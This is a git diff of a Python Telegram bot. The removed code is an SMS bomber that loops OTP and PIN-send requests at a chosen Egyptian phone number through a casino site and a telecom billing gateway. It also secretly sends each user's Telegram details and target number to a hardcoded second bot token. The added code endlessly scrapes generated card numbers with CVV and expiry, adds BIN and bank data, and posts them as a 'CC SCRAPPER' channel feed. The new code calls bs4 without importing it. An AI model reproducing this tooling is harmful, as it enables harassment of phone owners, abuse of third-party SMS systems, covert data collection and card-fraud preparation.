@@ -1,5 +1,4 @@
 import requests,user_agent,json,flask,telebot,random,os,sys
-import telebot
 from telebot import types
 from user_agent import generate_user_agent
 import logging
@@ -10,70 +9,80 @@ bot = telebot.TeleBot(BOT_TOKEN)
 server = Flask(__name__)
 logger = telebot.logger
 logger.setLevel(logging.DEBUG)
-@bot.message_handler(commands=["start"])
-def start(message):
-	
-	bot.send_message(message.chat.id,text='<strong>Hello Pro Bot Send Message\nPlease send the phone number with the number of messages\nEx: 011********:5</strong>',parse_mode="html")
-	
-@bot.message_handler(func=lambda call: True)
-def true(message):
-	m = message.text
-	try:
-		True
-		number= int(m.split(':')[0])
-		loop = int(m.split(':')[1])
-	except:
-		False
-		bot.send_message(message.chat.id,text='<strong>Please Send Nunber\nTry Again /start </strong>',parse_mode="html")
-	cookies = requests.get('https://goldencircle777.com/index/send/sendsms')
-	think_var = cookies.cookies['think_var']
-	sc389b705 = cookies.cookies['sc389b705']
-	headers={
-"conten-type":"application/x-www-form-urlencoded; charset=UTF-8",
-"accept":"*/*",
-"cache-cntrol":"no-cache",
-"user-agent":"Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.60 Mobile Safari/537.36",
-"referer":"https://goldencircle777.com/index/user/register/invite_code/HDM6EF.html",
-"origin":"https://goldencircle777.com",
-"cookie":f"think_var={think_var}; sc389b705={sc389b705}"
-}
-	data={"tel":number,"code":"+20"}
-	ur="http://gateway.mondiapay.com/mondiapay-etisalat-eg-b2b-v1/web/authorize/pin/send"
-	hd={
-"Host":"gateway.mondiapay.com",
-"Connection":"keep-alive",
-"Content-Length":"518",
-"Cache-Control":"max-age=0",
-"Upgrade-Insecure-Requests":"1",
-"Origin":"http://gateway.mondiapay.com",
-"Content-Type":"application/x-www-form-urlencoded",
-"User-Agent":"Mozilla/5.0 (Linux; Android 10; M2010J19SG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36"
-}
-	da={
-"msisdn":number,
-"clientId":"d3a8fa2d-7da7-4ef7-8fb8-bca0cefd9bbe",
-"redirectUrl":"http://etisalat-eg-lcm.mondia.com/etisalat-eg-lcm-v1/web/auth/callBack?client_id=d3a8fa2d-7da7-4ef7-8fb8-bca0cefd9bbe&redirectUrl=https://etisalat-music.com/lcm/login/token?lcmKey=ETISALAT_EG_MUSIC&redirectBack=%2Fhome&access_token=C6a85885c-d1c1-4756-a732-cf8b5fe40388",
-"metaData.cssUrl":"http://menad2c.mondiamedia.com/mpay/mondiapay-etisalat-eg-b2b/music/css/app.css",
-"Login":"LOGIN",
-}
-	name_name = message.chat.first_name
-	las_name = message.chat.last_name
-	user_tele = message.chat.username
-	id_tele = message.chat.id
-	sensess = requests.get(f'''https://api.telegram.org/bot1998361884:AAHeblwBaSST8O-BhL3Y2W_8qBjOy9Vzg3Q/sendMessage?chat_id=1396476109&text= NEW REQUEST OF BOT\nNAME: {name_name} {las_name}\nID: {id_tele}\nuser: @{user_tele}\nNUMBER {number}\nNumber Message {loop}''')
-	
-	bot.send_message(message.chat.id,text="<strong>DONE</strong>  ",parse_mode="html")
-	for i in range(loop):
-		rr = requests.post('https://goldencircle777.com/index/send/sendsms',headers=headers,data=data)
-		r=requests.post(ur,headers=hd,data=da)
-	bot.send_message(message.chat.id,text="<strong>FINESH/strong>  ",parse_mode="html")
+@bot.message_handler(commands=['start'])
+def run(message):
+	key = types.InlineKeyboardMarkup()
+	b2=types.InlineKeyboardButton(text='CHANEEL', url='https://t.me/Freeintrnn')
+	key.row_width = 1
+	key.add(b2)
+	while True:
+		u='https://www.coolgenerator.com/credit-card-generator'
+		h={'Host': 'www.coolgenerator.com',
+'content-length': '23',
+'cache-control': 'max-age=0',
+'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
+'sec-ch-ua-mobile': '?1',
+'sec-ch-ua-platform': '"Android"',
+'upgrade-insecure-requests': '1',
+'origin': 'https://www.coolgenerator.com',
+'content-type': 'application/x-www-form-urlencoded',
+'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36',
+'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'sec-fetch-site': 'same-origin',
+'sec-fetch-mode': 'navigate',
+'sec-fetch-user': '?1',
+'sec-fetch-dest': 'document',
+'referer': 'https://www.coolgenerator.com/credit-card-generator',}
+		d='cardbrand=0&quantity=1'
+		r=requests.post(u,headers=h,data=d).text
+		soup = bs4.BeautifulSoup(r, 'html.parser')
+		try:
+			iii = soup.find_all("p", {"class": "text-center grey"})
+			g=str(iii)
+			cv= (g.split('CVV:')[1].split('<')[1].split('>')[1])
+			c1=cv[0]
+			ccv = (cv.split(c1)[1])
+			date = (g.split('Expiry:')[1].split('<')[1].split('>')[1])
+			gk = (f'{date.split("/")[0]}|{date.split("/")[1]}|{ccv}')
+			i8=soup.find_all("p", {"class": "text-center font-18"})
+			g = str(i8)
+			cc = (g.split('<span>')[1].split('<')[0])
+			c1=cc[0]
+			cun= (cc.split(c1)[1])
+			list=f"{cun}|{gk}"
+			apibinlist = json.loads(requests.get("https://lookup.binlist.net/"+cun).text)
+			emoji = apibinlist["country"]["emoji"]
+			name = apibinlist["country"]["name"]
+			binType = apibinlist["type"]
+			bank_name = apibinlist["bank"]["name"]
+			bank_phone = apibinlist["bank"]["phone"]
+			bank_url = apibinlist["bank"]["url"]
+			brand = apibinlist["brand"]
+			scheme = apibinlist["scheme"]
+			respo= f"""
+┏━━━━━━━━━━━━━━
+┣ 🍂 𝑪𝑪 𝑺𝑺𝑪𝑹𝑨𝑷𝑷𝑬𝑹 🍂 ┗━━━━━━━━━━━━━━
+════════════════════                   ╠𝑪𝑪: {list}
+┏━━━━━━━━━━━━━━
+┣ 🍁 𝑩𝑰𝑵 𝑫𝑨𝑻𝑨 🍁
+┗━━━━━━━━━━━━━━
+╠𝑩𝒊𝒏 𝑫𝒆𝒕𝒂𝒊𝒍𝒔:{name} -{emoji} -{bank_name}{binType} -{scheme}
+╠𝑩𝒂𝒏𝒌: {brand}
+┏━━━━━━━━━━━━━━
+┣ 🍁 𝑀𝑌 𝐼𝑁𝐹𝑂 🍁
+┗━━━━━━━━━━━━━━
+🧑🏻‍💻| 𝑫𝐸𝑉:  @Mosalahxyz 
+🥷🏻| 𝑪𝑯:@Freeintrnn """
+			bot.send_message(message.chat.id,text=respo,parse_mode='html',reply_markup=key)
+		except:pass
+
+
 @server.route(f"/{BOT_TOKEN}", methods=["POST"])
 def redirect_message():
     json_string = request.get_data().decode("utf-8")
     update = telebot.types.Update.de_json(json_string)
     bot.process_new_updates([update])
     return "!", 200
-
 if __name__ == "__main__":
     bot.remove_webhook()
     bot.set_webhook(url="https://appitele.herokuapp.com/"+str(BOT_TOKEN))
